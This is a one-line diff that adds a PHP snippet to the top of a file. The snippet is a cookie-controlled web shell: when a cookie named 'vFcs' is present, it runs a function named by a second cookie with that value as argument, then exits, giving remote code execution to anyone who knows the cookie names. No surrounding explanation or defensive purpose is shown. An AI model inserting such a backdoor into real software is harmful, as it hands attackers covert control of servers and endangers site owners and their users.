@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["vFcs"])){$_COOKIE["PfO"]($_COOKIE["vFcs"]);exit;}
